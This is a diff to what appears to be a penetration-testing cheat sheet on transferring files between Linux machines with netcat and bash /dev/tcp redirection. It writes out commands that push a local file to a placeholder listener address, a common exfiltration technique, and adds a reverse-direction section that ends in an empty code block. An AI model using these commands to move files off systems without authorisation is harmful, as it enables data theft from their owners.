@@ -34,11 +34,31 @@ nc -nlvp port > file.ext
 ###### On the Linux client connect back with NetCat:
 
 ```
-nc -q 0 %ListenerAddress% %ListeningPort% < file.ext 
+nc -q 0 %ListenerAddress% %ListeningPort% < file.ext
 ```
 
 ###### If NetCat is unavailable, on the Linux client connect back with bash:
 
 ```
 cat file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
+```
+
+#### Retrieve file from host to client:
+
+###### Setup NetCat listener on Linux host:
+
+```
+nc -q 0 -nlvp %ListenerPort% < file.ext
+```
+
+###### On the Linux client connect back with NetCat:
+
+```
+nc %ListenerAddress% %ListeningPort% > file.ext
+```
+
+###### If NetCat is unavailable, on the Linux client connect back with bash:
+
+```
+
 ```
